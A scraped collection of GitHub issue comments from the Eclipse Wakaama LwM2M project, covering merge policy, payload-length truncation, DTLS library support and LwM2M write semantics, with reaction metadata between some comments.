Another workaround would be to agree on generally doing ""Rebase and merge"", but ""Create a merge commit"" for PRs which contain cosmetic changes. Would be a bit hit-and-miss, because deciding which one to do will rely on us humans, and is not enforceable (?) by tooling.

> Also if the developer branch has several commits that make sense to squash they should be squashed so the master branch doesn't get cluttered.

If a PR has commits that should be squashed, then the developer should squash them locally and (force push) them before merging. Only this way we can actually review how the commit looks like before merging (and enforcing rules over it).","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDgyOTk1MjExNg==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

In a previous private discussion at the very beginning of the revival, I proposed to keep a clean and readable history and so don't use merge anymore . @sbertin-telular validate it so we go for it in a first time. 

I deactivated the ""Create merge commit"" as it sounds obvious that it was not compatible with decision took before and let ""Squash and merge"" because I was not sure how it behave. ( because I don't  use the github button :grimacing:)

I can disable ""Squash and merge"" if needed. (one of the rare setting I have access to)

**My opinion is clearly less important than the dev ones**, but I strongly discourage you to follow that way.  Merge commit bring to unreadable spaghetti code repository.

Still just my opinion but If I should chose between ""readable history"" and `.git-blame-ignore-revs`, I largely prefer the readable history.

> Anything else we should consider?

If you want to keep both and also keep  ""pass validation(github action) before to integrate"". 
You can ""rebase --force"" the PR on `master` then just do a fast-forward (manually or with github if it behave like this, again I'm not sure how it behave) to integrate it in`master`.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDgzMTEyNzM3Nw==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

This can be reproduced by starting the client with  `lwm2mclient -t 100`. After initial registration an update is sent every 7s.

The time between registration updates is defined via the lifetime resource in the _LWM2M Server_ IPSO object /1/x/1.  There is no RangeEnumeration specified there, so I would guess the whole positive Integer range (up to 64bit signed) in seconds is valid here up to 9,223,372,036,854,775,807.

~~As far as I understand, there should be no limitations by any CoAP timing parameters since this is a new (confirmed) request issued by the client?~~

~~Maybe not directly linked to this issue but, shouldn't we use some time shorter than lifetime/2 between registration updates. That would make the session more robust, because then the second update will arrive at the server with a safety margin and not just when the client expires.~~
Ok, I think I got what is happening here. Wakaama uses COAP_MAX_TRANSMIT_WAIT as a safety margin which is subtracted from the lifetime as I mentioned above. For values less than COAP_MAX_TRANSMIT_WAIT the registration update timeout it set to lifetime/2. This results in the following behavior:
- lifetime 30s -> update every 15s
- lifetime 90s -> update every 45s
- lifetime 100s -> update every 7s

> What is the status on finding a new project lead?

I guess we need a name, then a I will be able to launch an election. 

So team, let me know who you would like to have as project lead or who is comfortable with the idea to take this role. 

I share here some resources about what means being a project lead : 
> **Project Lead**
>
>   The project lead is more of a position of responsibility than one of power. The project lead is immediately responsible for the overall well-being of the project. They own and manage the project’s development process, coordinate development, facilitate discussion among project committers, ensure that the Eclipse IP policy is being observed by the project and more.
>   A Project Lead, the first level in the Project Leadership Chain, is responsible for the overall well-being of a specific Project and serves as the primary liaison between that Project and the EMO.

and :

- https://waynebeaton.wordpress.com/2010/03/09/project-leadership/

Historically, it was @sbertin-telular , @rettichschnidi who made this ""revival"" possible.
Regarding past involvement, I guess @sbertin-telular would have been an natural choice but he will not be able to do that. (https://github.com/eclipse/wakaama/issues/572#issuecomment-811960168)
So maybe @rettichschnidi could be a possible choice ?

Of course all other propositions are welcome.
Team, let me also know if you have any concern about this ?

Just to be sure when you say  ""based on the LwM2M specification"", you talk about : 
1.  the LWM2M specification in a general way 
2. or you specifically refer to **ETS** - Enabler Test Specification (Interoperability)for Lightweight M2M)?

for 1. it totally makes sense.
for 2. f I didn't look at ETS recently, but it probably make sense too. 

In all case, TestObject could be a good start to think about that (so review at  OpenMobileAlliance/lwm2m-registry#639 are welcomed :pray: )

The LwM2M ETS focuses on testing LwM2M functionality -- not TLS, CoAP or any other of the referenced specs. The assumption is that the IETF specs we make use provide their own test cases and the implementations of those IETF specifications already have their test strategy. In practice, this is a somewhat bold assumption. While many authors of IETF specifications (or others in the working group) write implementations of their specifications, there is in general no test description published with RFCs nor is there a structured test approach used in general. Hence, the level of testing varies hugely throughout the IETF. 

If we just focus on LwM2M-specific testing, then there is the question about how those tests should be done automatically. I have been working with the IETF OAuth community and they have created automated test (see https://github.com/rohe/oidctest). I was thinking about learning something from that test framework. 

I am, of course, open to other suggestions.

I looked at this very quickly, for now this is not really clear to me how this tool looks like ? or how is it supposed to be used.
(E.g. how we add test ? how you test your implementation against it ? is it a kind of interoperability check  or more spec validation test ?).

About testing LWM2M automatically, I can imagine several solutions
(:warning:  I didn't think too much of this :warning: )

## 1. Test API

Define a kind of common API  that client, server and bsserver should implements. (I don't know what could be the best ? CLI API ? REST API ? any more simple socket  API ? ...)
We write our LWM2M automatic tests using only the defined API.
Then implementer need to provide binary which respect the defined API.

**Pros :**  you can run your tests with any combination of Client / Server / Bsserver
**Cons:**  All project implementation need to provide binaries which implement the common API defined. 


## 2. Testing Service
 
 Another solution would be to try to write tests which are only based on LWM2M API. Meaning you just need to provide something which support the LWM2M spec/API. You take your implementation and just connect it to a kind of testing service. 

**Pros:** no need to implement a test dedicated binary.
**Cons** : 
 - I feel we can easily imagine a Testing Service which acts as a LWM2M server and BS server to easily test clients. But testing server or BS server this way seems more complicated to me.
  -  You don't really test interoperability but just validity against one Testing Service.

Using wakaama client from examples I am implementing some basic firmware update functionality. I have added my implemenation to the ""write"" method of the firmware object. Sending files from the leshan server to my client is working fine, but surprisingly the maximum file size is limited to ~ca. 65 kB (u16 payload size). Is this intended?

I can see that in the **coap_packet_t** struct, the member payload_len is defined as uint16_t. But in many other places in wakaama client example code, the payload_len is defined as int or size_t.

For example:

`void lwm2m_handle_packet(lwm2m_context_t* contextP, uint8_t* buffer, int length, void* fromSessionH);`

is using ""length"" as int and in this function we have casting from int to u16 which looks strange to me:

packet.c -> line 476

`coap_error_code = coap_parse_message(message, buffer, (uint16_t)length);`

Could you be so kind and provide some clarification why the payload_size is defined in **coap_packet_t**  as u16? Is this a requirement of CoAP protocol?

After I have changed this u16 to u32, everything working fine (at least in my ""playground"") and I am able to send files larger than ~65 kB succesfully.

Without any changes in coap_packet_t struct for files larger than 65 kB there is an COAP_406_NOT_ACCEPTABLE in response for write operation from leshan server which is because there is a casting from int to u16, so the payload size is truncated and due to that, wrong size is passed further which ends in fail in one of if statements.

Writes larger than 65kB will be truncated because of the implicit type conversion. No error is reported, the write will just finish ordinarily.

My suggestion would also be to increase the payload_len preferably to `size_t` which would allow larger writes. `size_t` is already used in some parts of Wakaama to store buffer lengths. The UDP packet size limit should not be an issue because block transfer will be used anyways as you said above.

These repos are unfortunately not publicly available. But it should be pretty straight forward to implement a running prototype based on the current examples. Maybe I have some old files around and could create a working draft later this week.

@tuve I have never worked with tinydtls but mbedtls is highly configureable. Supported algorithms could be configured on compile time and therefore should reduce the footprint. Same is possible for buffer sizes to reduce heap usage for example.

Very good question but not so easy to decide. I guess it depends on : 
- the scope wanted for the project
- how much it is easy to make it part of core library but also to make it possible to use other TLS/DTLS library (if we still want to do that).
- how much it is compatible with https://github.com/eclipse/wakaama/issues/494

Personally, I have no answer but I feel this are good questions for Wakaama Committers and Community.

I provided a sample but keep in mind, it is only a sample.

My opinion: Before thinking about integrating DTLS into wakaama (even multiple libraries), I would discuss the possibility to use wakaama with different CoAP libraries/or even a MQTT/HTTP library and try to seperate the layers.

Be careful, if you use it!
You must use the right IANA code-point for the extension, depending on which version of the DTLS 1.2 CID draft you are want to use, or you must use, because it's the only implemented in the mbedtls version you are using. At least, if you want to use it with Californium or Leshan.

Wakaama does not support the send operation (yet). However if you want to send data to the server you can use the observation operation. You would observe the resource and the client sends an update immediately when there is new data available. The attributes pmin and pmax can be tuned to get immediate updates. E.g. low pmin and high pmax value.

- which server implementation do you use, leshan?
- which dtls binding do you use? Years ago it was tinydtls. In the last weeks mbedtls was considered.
    - if it is tinydtls, maybe someone can check, to which commit wakaama is referring to. A recent version is able to do a rpk handshake with Californium.
    - if it is mbedtls, at least some time ago, that doesn't support RPK.

thank you for the response. I use tinydtls with leshan server. I tested the server with leshan client and the handshake works for TLS_ECDHE_ECDSA_WITH_AES_128_CCM_8 cipher suit. So the server should be ok.

For tinydtls, I dont quite sure where to put the server public key (the leshan client app do require it).
In ""dtlsconnection.c"" file I could found ecdsa_priv_key, ecdsa_pub_key_x, and ecdsa_pub_key_y, which are the key pair of the client I guess. But then where to put the server public key?
I also try to replace

Did you read the  [IP Capturing](https://github.com/eclipse/californium/wiki/Logs-and-IP-Capturing-%E2%80%90-How-To-Provide-The-Right-Information#ip-capturing)? Does that say, ""copy a screenshot""? Or provide the selected records as zipped capture?

That picture doesn't say more then 1000 captured records, the opposite is true: browsing that couple of records helps much more then 1000000000000 pictures of wireshark screenshots. That pictures are only topped by movies of the wireshark recording ...

For me the question is, who sent the alert (not visible in the picture, but would be easy to check, in a capture).

Anyway, I will check tinydtls, how the server's key is handled. I guess, there is a validation callback, which by default ignores it ;-).

(1) I'm not sure I get you but if you mean that ""if pmin/pmax is set at /5 level then those attributes are applied to all resources under /5"" then it's correct to me.

In the example given by @Asher9977 all resources under /5 except /5/0/1, i.e., /5/0/3, /5/0/5 ... will have 100/200(PMIN/PMAX) attached, whereas /5/0/1 will have 10/20(PMIN/PMAX) attached.

At least I'm very much less confident.
I totally understand your point and it makes sense.

I try to summarize my confusion here. 
Let's agree on some wordings : 
- observation level : is the level (object/object instance / ...) where the notification relationship is established. 
- assignation level : is the level (object/object instance / ...) on which the write attribute is done.
- attachment level : is the level (object/object instance / ...) on which the attribute is really applied.

(At least this is my understanding)

Following this :point_up:, I would say ""yes"" to :point_down:. because the assignation level is at object level but should be applied (attachment level) at resource level. 

> In the example given by @Asher9977 all resources under /5 except /5/0/1, i.e., /5/0/3, /5/0/5 ... will have 100/200(PMIN/PMAX) attached, whereas /5/0/1 will have 10/20(PMIN/PMAX) attached. So wouldn't an observe on /5 have 10/20(PMIN/PMAX) since one resource will trigger the update more frequently?

But reading this : https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues/478
I'm now confused again...

I'm not sure if you understand this like me but it seems that :
1. pmin/pmax attribute assigned to resource level MUST NOT be used for observation relation established at object instance level.
2. pmin/pmax attribute assigned at object instance level MUST be used for observation relation established at object instance level. 

Eventually, I can vaguely understand the 1, but that seems to imply that attributed are never used for observation at Object or Object instance level. (because all have resource attachment level)

The 2 seems to say that the pmin/pmax is applied to object instance level. (but the spec says that pmin/pmax are only attachable at resource level)

So currently, I'm lost... :sweat_smile: 
Did I missed something ?

That's a possible approach but will lead to a situation where nobody contributes platform-specific code to Wakaama, which makes Wakaama usable only for educational purposes rather than something that can be used for actual deployments. 

There are projects that follow a different approach. For example, the Mcuboot project implements a bootloader and it can be run on existing hardware while at the same time offering an abstract level that remains unchanged from the hardware. The consequence is that you can actually run it on hardware and if you need to port it to an unsupported hardware platform you can use the existing code as a reference.

For [UDP RFC768](https://datatracker.ietf.org/doc/html/rfc768) the length is encoded in the UDP header.
CoAP uses that length in the UDP header and don't add one on its own (CoAP over TCP does, but not over UDP). Usually the UDP stack only forwards a UDP message after reassembling, or at least, the information, if reassembling is required and fragments are missing is left to that IP-stack.

So, CoAP doesn't have that length, you need to search at your modems IP-stack.

welcome to Wakaama. The `bootstrap_server` example looks for a configuration file in the current working directory. In your case you can copy the `bootstrap_server.ini` into `build_bs` and the server should start. Alternatively you can use the `-f` argument to specify a custom path to the file.

```
 ./lwm2mclient_tinydtls -s 4f75724964656e74697479 -i public -b
```

May not work with the wakaama bootstrap server, though it uses PSK/DTLS

[bootstrap_server.ini](https://github.com/eclipse/wakaama/blob/master/examples/bootstrap_server/bootstrap_server.ini)

>  Information on a LWM2M server running on localhost
> # using Pre-Shared Key security

> security=PSK
> public=4f75724964656e74697479
> secret=4F7572536563726574
> 

my feeling is, you used the line `public=4f75724964656e74697479` for the parameters.
That is not the way, it is intended. if you want to connect to a lwm2m server, which is configured with these credentials of the ""bootstrap_server.ini"", you must use:

```
 ./lwm2mclient_tinydtls -s 4F7572536563726574 -i 4f75724964656e74697479
```
In sum, it requires one, which is common about the current implementation state of wakaama and how that is used.
Sometimes, it's easier to check for [leshan](https://github.com/eclipse/leshan), if you search for an lwm2m-server.

It shows some traffic to and from 5784. If your bootstrap server runs on 5685, that traffic in the capture is not related to your question. A CoAP/DTLS endpoint runs on a host's service port. And if you want to capture the traffic you need to use that port to filter the packages.

Maybe wakaama prints an error for ""otherwise"" as well, but I'm not sure why.

And again, I can't see, that the bootstrap-server  supports DTLS. The client uses

```
#ifdef WITH_TINYDTLS
#include ""dtlsconnection.h""
#else
#include ""connection.h""
#endif
```

and I can't find that in the bootstrap-server.

So, maybe you're better off, to start without DTLS to become more common to lwm2m.

Again, starting from the begin:
I need a capture of the handshake in order to say anything. But from our conversation so far, I don't think your able to provide that.

The `connection_rehandshake` seems to be broken.
if you like, I don't know, if that makes it better or not, try out:

```
    // start a fresh handshake
    int result = dtls_connect(connP->dtlsContext, connP->dtlsSession);

    if (result < 0) {
         printf(""error dtls reconnection %d\n"",result);
    } else if (result > 0) {
        // dtls_connect uses value larger than 0 also for success
        result = 0;
    }
    return result;

DTLS is the name of the encryption protocol (see [RFC6347](https://www.rfc-editor.org/rfc/rfc6347.html) ).
tinydtls is the name of one of the DTLS implementations (see [eclipse/tinydtls](https://github.com/eclipse/tinydtls)).
mbedtls is an other DTLS implementation (see [Mbed-TLS](https://github.com/Mbed-TLS/mbedtls])). There is an open PR #626 and an issue #623 about supporting mbedtls.

All that will not help you to use DTLS successful with on of the wakaama servers, their implementations are just not supporting it. At least, that's what I see.

Therefore, just try to use it without DTLS and see, if that works for you as expected.
Only if that is the case, you may start to consider using [eclipse/leshan](https://github.com/eclipse/leshan) as server with DTLS support.

Though lwm2m is a specification, it refers to dtls, not to a specific implementation as ""tinydtls"". 

> Is that because lwm2m is based on coap protocol?

No. lwm2m is a specification, which refers to the coap specification [RFC 7252](https://www.rfc-editor.org/rfc/rfc7252.html) and the dtls specification  [RFC6347](https://www.rfc-editor.org/rfc/rfc6347.html).

wakaama and leshan are implementations of lwm2m. As lwm2m refer to coap and dtls, those lwm2m implementations are also using implementations for coap and dtls. For leshan, that's currently mainly [eclispe/californium](https://github.com/eclipse/californium), which implements coap and dtls. For wakaama, it's ""erbium"", which is included in the source as coap implementation. And tinydtls is used by the wakaama lwm2m-client.

At least, I consider that. it may be even, that you need to consider it in your application code, by not sending new 
request until the old ones are completed (maybe by timeout).

> And the PROBING_RATE is also not been found in wakaama. How to explain this situation?

Please explain, where you need that? 
AFAIK, that value is only relevant, if you send data the first time to an peer via an unknown ip-route. It is used to prevent ""transmission congestion"" assuming very ""constraint bandwidth"".  
In many cases, it already works with NSTART-1 and ""timeout is doubled"" on retransmission.

See also [core-mailing-list](https://mailarchive.ietf.org/arch/msg/core/tbfFV-HbzVhKi4_4Ix52xze4z70/)

(Let me try to explain my involvement: it's years ago, that I worked with/in wakaama. And also years ago, that I decided, that improving [eclipse/californium](https://github.com/eclipse/californium) is more important for me. Last year I started to improve tinydtls as well, in order to benefit more from Californium unique features. I mainly used mobile IoT (LTE-M, NB-IoT) and neither the bandwidth nor the device are too constraint there. So the most concerns don't apply to my recent work. I don't plan to focus back on wakaama.)

I'm not sure, if I get that. I would assume, that a lwm2m-device is considered to implement at least some custom code to fill the some application values in the lwm2m resources.

> So, What does mean unknown ip-route?

IP-messages are usually forwarded over a couple of links, e.g. ""wifi""-""dsl-router""-""ip-provider-network""-""cloud-provider-network"". A ""unknown ip-route"" is then the route, which the message will take, if there was no traffic for a certain amount of time. It may use different links with other speed. Generally, this doesn't make too much difference, but assuming really ""narrow-banded"" links, it requires to relax the timings.

Yes, he said that an application should not send a sustained rate of more than about 1 B/s to a peer endpoint that might not be reachable (“into thin air”).

That depends mainly on the used message size for the lwm2m-(re)-registration and the notifies. It's not really granted, there are no ""means"" to throttle it, except you adjust the initial timeout accordingly. If this is relevant for you at all depends then more on the really used network.

    - As a summary:
        a) Battery /3/0/9 changes to 56 but fails to send notify because device is offline
        b) As a result of above, device forces itself going online to send pending notification

        d) Server responds first with an ACK of Register Update and then...
        e) Server responds with a RST to received notification. Under LwM2M, this means server is not recognizing received notification but requests client to stop retransmitting that notificacion
        f) After above, client behaves ok as following /3/0/9 resource updates do not trigger any notification

Nor so much an issue really, but more a request for help:

In my wakaama build I add various functions, and one of them is using pthread and sqlite3.
I added the following in the wakaama.cmake:

add_link_options(
    -lpthread
    -lm
    -lsqlite3
)

This is accepted, though the final CMakeFiles/lwm2mclient_tinydtls.dir/link.txt which contains the actual compile arguments shows that the libraries are at the start of the cc, see this excerpt: 

==> link.txt <==
/usr/bin/cc   -lpthread -lm -lsqlite3 CMakeFiles/lwm2mclient_tinydtls.dir/lwm2mclient.c.o ....

This result in missing functions in pthread etc.

If I edit the link.txt and move the -lpthread -lm -lsqlite3 to the end of the command, I have a perfect build.

What can I do to have these libraries always at the end in the compile command ?
Where in the wakaama.cmake, or other input file can I control this ?

It tried this:

I updated this file :   `examples/client/CMakeLists.txt  with target_link_options()` in the next lines:

```
    add_executable(lwm2mclient_tinydtls ${SOURCES})

    set_target_properties(lwm2mclient_tinydtls PROPERTIES DTLS ""tinydtls"")
    target_compile_definitions(lwm2mclient_tinydtls PRIVATE LWM2M_CLIENT_MODE LWM2M_BOOTSTRAP LWM2M_SUPPORT_SENML_JSON)
    target_sources_wakaama(lwm2mclient_tinydtls)
    target_sources_shared(lwm2mclient_tinydtls)

    target_link_options(lwm2mclient_tinydtls PRIVATE LINKER:-lpthread -lm -lsqlite3)
```

This will also generate a faulty cc command.  See the very top of the link.txt file:

`CMakeFiles/lwm2mclient_tinydtls.dir/link.txt`

`/usr/bin/cc -Wl,  **-lpthread -lm -lsqlite3**  CMakeFiles/lwm2mclient_tinydtls.dir/lwm2mclient.c.o  <other .o files>`

And this build results in missing libraries of pthread and sqlite3, because the -l options are not take at the start of the cc.

Again, if I move the `-lpthread -lm -lsqlite3` to the end of the link.txt and run this as a copy/paste, it compiles without any error.

I am not sure its a cmake issue really. The previous versions of Wakaama accepted this command in the same CMakeLists.txt:

`   TARGET_LINK_LIBRARIES(lwm2mclient pthread m sqlite3)`

The result of that function/macro resulted in the right syntax of cc, see the libraries at the end of the cc command:

`   /usr/bin/cc     CMakeFiles/lwm2mclient.dir/lwm2mclient.c.o <and all the other .o's>  -o lwm2mclient -rdynamic -lpthread -lm -lsqlite3`

In general terms to build Wakaama against an application; what would be the preferred way to link these type of libraries otherwise ?  Or should I open a question to cmake how to control the position of the libraries when using  target_link_options() ?

Many thanks again, regards.

I have an object with three multiple type resources. I would like to be able to write either all of them, a subset of them, or one of them using object replace.

If I want to write new values to a subset of the resources using an object replace, I specify the new values for the resources I want to write as well as no value, empty brackets, for the resources I don't want to write. But that makes Wakaama return ""NOT_ACCEPTABLE"".

I can't find any mention in the LWM2M-specification (v. 1.0) that you're not allowed to write an empty instance to a resource.
Is this a bug in Wakaama or am I using the wrong method to achieve what I want?

Just to be sure what you call  ""object replace"" is  ""send a WRITE  request targeting an object with replace mode"" ? 

But targeting an object is not allowed by the LWM2M specification, **object instance Id is required**.

Parameter | Required | Default Value | Notes
-- | -- | -- | --
Object ID | Yes | - | Indicates the Object.
**Object Instance ID** | **Yes** | - | **Indicates the Object Instance to write.**
Resource ID | No | - | Indicates the Resource to write. If the final target is not a Resource Instance (see below), the payload is the new value for the Resource.The payload is the new value for the Resource.  If no Resource ID is indicated, the Resource Instance ID MUST NOT be indicated , then the value included payload is an Object Instance containing the Resource values.
Resource Instance ID | No | - | Indicates the Resource Instance to write. An error MUST be returned by the Client, if the Resource ID is absent, if the targeted Resource is not defined as a Multiple-Instance Resource, or if the targeted Resource Instance doesn't exist.
New Value | Yes | - | The new value included in the payload to update the Object Instance, a Resource or a Resource Instance.

(source : [LWM2M v1.1.1@core§Table: 6.3.3.-1 Write Parameters](http://www.openmobilealliance.org/release/LightweightM2M/V1_1_1-20190617-A/HTML-Version/OMA-TS-LightweightM2M_Core-V1_1_1-20190617-A.html#Table-633-1-Write-Parameters))


So let's suppose you ""object replace"" means ""Send a WRITE request targeting object instance with replace mode"".

> If I want to write new values to a subset of the resources using an object replace, I specify the new values for the resources I want to write as well as no value, empty brackets, for the resources I don't want to write. 

Using Replace Mode will erase existing LWM2M node with the new one you provide. The specification says : 

> _""Replace: replaces the Object Instance or the Resource(s) with the new value provided in the ""Write"" operation.  When the Resource is a Multiple-Instance Resource, the existing array of Resource Instances is replaced  to the condition the LwM2M Client authorizes that operation.""_

So my understanding is that you don't need to put resource you don't want to write.

I am also involved with this, so I would like to clarify and make sure we understand correctly:
What we have is an object instance with three multiple resources. We would like to, in one write, be able to clear all resource instances on a resource (replace with 0 resource instances), and replace all resource instances with new instances in another of the three resources. 

Assuming we ""Send a WRITE request targeting object instance with replace mode"" in this case, should we:
1. Issue a write with 0 resource instances to the resource we wish to clear (this causes wakaama to return NOT_ACCEPTABLE), **or**
2. Not address that resource at all and only target the resources which will have new instances, which would then clear the unaddressed resources implicitly

AFAIK, on this particular point the LWM2M specification is identical in v1.0.x and v1.1.x :

Oh OK, I didn't get the question, It's much clear now

I guess generally both should works but the specification doesn't explicitly say how this should be encoded ... so this could differ from one implementation to another
And this is also depend of the Content Format  you're using. 

E.g : For SenML+json from LWM2M v1.1.x : we never get a clear answer about that : https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues/494

I tested with **Leshan** and it support both with some different behavior depending on content format. 

Let's suppose you have an instance 0 of object [3441](https://github.com/OpenMobileAlliance/lwm2m-registry/blob/prod/3441.xml) which looks like : 
```
/3441/0/1110 :  { 0 = ""string1"",  1 = ""string2"" }
/3441/0/1120 :  { 1= 11, 1 = 22 }
```

#### 1. if you try to write 
``` 
/3441/0/1110 :  { 3 = ""newString""}
```
All content format will behave the same way and resource /3441/0/1120 will not exist anymore, if you try to read it you get 404 NON_FOUND.

#### 2. if you try to write 
``` 
/3441/0/1110 :  { 3 = ""newString""}
/3441/0/1120 :  { }
```
All content format will behave like above :point_up: (return NOT FOUND)  except for TLV.
For TLV, if you try to read /3441/0/1120, the resource exists and you get an 2.05 Content with an empty resource.

It seems preferable to have TLV, json, senml behaving the same.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/IC_kwDOASCHpc5OKezU/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Ideally, I agree.

In practice, I think that an empty resource or no resource at all (NOT FOUND) is not the same semantically speaking.
So ideally, when you write an empty resource, you should read an empty resource.
And if you write no resource at all, you should get a NOT_FOUND.

But we can not implement this for all ContentFormat because  some Content Format encodes both exactly in the same way.

Eg. for SenML JSON 

```
/3441/0/1110 :  { 3 = ""newString""}
``` 
will be encoded in 

```
 [{""n"":""/3441/0/1110/3"",""vs"":""newString""},
```
and 
```
/3441/0/1110 :  { 3 = ""newString""}
/3441/0/1120 :  { }
```
will also be encoded in : 
```
 [{""n"":""/3441/0/1110/3"",""vs"":""newString""},
```

So I don't know if it is better to : 
 - have consistent behavior with all format
 - OR do the best we can do by content format. ","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/IC_kwDOASCHpc5OSCl7/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

I use .* frequently on my embedded platform (Quectel BG95) and it work without any issues.

1. Revival has been started, but going on much slower than anticipated.
   At Husqvarna, we took part in the revival because we need Wakaama in an upcoming product. Luckily for us (and bad for Wakaama), we figured that most of our needs could already be served by the existing Wakaama code and therefore our focus shifted to other, more pressing areas. The pendulum is swinging back now however, as we need new features (> LwM2M 1.0) and therefore are, once again, more able and motivated to improve Wakaama.

AFAIK, Wakaama core library doesn't depend directly to any DTLS library. 
There are some examples in this repo which are using  `tinyDTLS` and so running DTLS 1.2.
But in theory, you should be able to use any DTLS implementation and so any version of the protocol.
(See some related discussion about it : https://github.com/eclipse/wakaama/issues/623)
By the way, there is a open PR about using `mbedtls` in example too, see https://github.com/eclipse/wakaama/pull/626.

At LWM2M level, the specification v1.0 and v1.1 doesn't mention DTLS v1.3.
Asking to OMA it seems this should be doable to use it but for now there is no recommendation provided : see https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues/540

In a more general way, DTLS v1.3 is very young. Since 2022 we begin to see some implementation of it but not widely widespread.

Hi! 
Thanks for the quick feedback and clarification!

> At LWM2M level, the specification v1.0 and v1.1 doesn't mention DTLS v1.3.

No, but LwM2M v1.2 is [mentioned](http://www.openmobilealliance.org/release/LightweightM2M/V1_2_1-20221209-A/OMA-TS-LightweightM2M_Transport-V1_2_1-20221209-A.pdf), while DTLS 1.3 in a *maybe* context. Seem to say that DTLS 1.2 is fully supported.

DTLS 1.2 is also mentioned [here](https://forum.iotcreators.com/topic/645/lwm2m-v1-2-is-out), but that is not well defined weather, and it seem that DTLS 1.3 is optional. 

> In a more general way, DTLS v1.3 is very young. Since 2022 we begin to see some implementation of it but not widely widespread.

It was released April 2022 (last year). The point being that nothing will ever be widespread before it's actually available! There are basically no FOSS server implementations (AFAIK) that supports DTLS 1.3 today. This at times when IoT development is going exponential.

One of the main new features of DTLS 1.3, the Connection ID, is backported to DTLS 1.2 via RFC 9146.
Eclipse/Californium supports DTLS 1.2 CID now for two years. Including graceful restart (really nice on server updates!) and CID load-balancing. In tinydtls a client only implementation is available as feature branch. I use that in a small cellular demonstration project no for more than a year with great success. MbedTLS has also recently updated to the final version of RFC 9146.

The left benefits of DTLS 1.3 are then.
- some data saving by a more compact record format (I don't expect that to be a game changer)
- improved security and newer crypto functions. Especially, the IETF seems to move forward only for TLS 1.3 based functions, e.g. ""subcerts"".

(Maybe @hannestschofenig completes the comparison, he's for sure ways more engaged than I.) 

Overall my feeling is, that it's more important to demonstrate the benefits of UDP based protocols, and that could be done with CoAP/DTLS 1.2 CID. We will see, if ""enough"" products are build on that, so that a development of DTLS 1.3 will be possible in Eclipse/Californium. I don't expect to have time for that in the next 18 months.
Alternatively, mbedTLS comes with DTLS 1.3 and maybe it's therefore a great idea to see, if leshan can make use of that via [java-coap](https://github.com/open-coap/java-coap) not only for coap+tcp.

@eabase, It seems to me that you try to convince us as much it's important to move to DTLS 1.3 and LWM2M 1.2.
Don't worry we know that, and if resources are available we will probably go in that direction in the future.

But currently,

**Concerning LWM2M 1.2** :

AFAIK, Leshan and Wakaama project are focus on LWM2M v1.1. 
I think it makes sense to first focus on LWM2M v1.1 before to jump in LWM2M v1.2. (especially as LWM2M v1.2 more or less includes LWM2M v1.1)
Resources on those projects are limited. Maybe from the outside it seems we move not fast enough. Sorry about that.

**Concerning DTLS 1.3** :

Wakaama and Leshan are LWM2M implementation, not DTLS / TLS implementation. So we are also limited by existing FOSS implementation of DTLS 1.3.

For Wakaama, AFAIK, you ""should"" be able to use any DTLS library. (and so you can try with few library who supports DTLS 1.3 : mbedtls, wolfssl ?)

For Leshan, AFAIK, there is no pure java implementation of DTLS 1.3 (Eventually, this binding https://github.com/open-coap/kotlin-mbedtls. If someone know others, please share :pray: )
And we will will not implement a DTLS 1.3 library in Leshan.
For now Leshan, strongly depends on [Californium /Scandium for DTLS  and it does not support DTLS 1.3](https://github.com/eclipse-californium/californium/issues/1337).
We are working on abstraction to be able to use different implementation than Cf/Sc but doing this abstraction and propose new implementation based on it will take lot of time.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/IC_kwDOASCHpc5WMNHP/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Hi Guys!  Again, thanks for quick feedback.

> One of the main new features of DTLS 1.3, the Connection ID, is backported to DTLS 1.2 via RFC 9146.
> ... The left benefits of DTLS 1.3 are then. ...

There are several features in DTLS 1.3 that I believe will be regarded as must-haves in the very near future:

- Substantial power saving when in deep sleep mode, nearly not possible in 1.2
- Substantial security improvements (removing insecure protocols)
- Zero touch provision support.

(_And I'm not just saying this from opinion, but we have several large customers who are requesting these very functionalities today._) The future is now. 😉 

The effect of lacking support, is that now a bunch of companies are hacking their own versions of LwM2M 1.1++ or 1.2++ in order to support some DTLS features here and there, further confusing and obscuring any standard compliance. These hacks are not FOSS, so detrimental to the community as a whole.

To summarize, the differences, in a more clear way:

Hope this helps.

Correction: [wolfSSL](https://github.com/wolfssl/wolfssl) does support DTLS 1.3 since release 5.4.0 (July 11, 2022).
We are still looking for other implementations to set up our interoperability tests.

No, unfortunately there is no support for DTLS 1.3 in mbedTLS yet.

1. [wolfSSL](https://github.com/wolfssl/wolfssl) (corrected link) - is **not** a *server*, just an SSL library. 
2. `TLS 1.3` is *not* the same as `DTLS 1.3`.

- GPL is mainly used as dual-license, where you may either open also your extending functions or pay a license fee.

With that, please ensure with other users, that there is really a benefit in supporting GPLv2 stuff. 
If so, AFAIK in order to use the EPLv2.0 / GPL dual-license model, it's required to re-license wakaama. That requires the agreement of all contributors (we would need to ask the Eclipse Foundation about the exact process).

(your comment on the 5. March with the table comparing DTLS 1.2 / DTLSS 1.3)

I'm not sure, if you mix up things.
Why should DTLS 1.2 or 1.3 have any influence on the CBOR encoding?

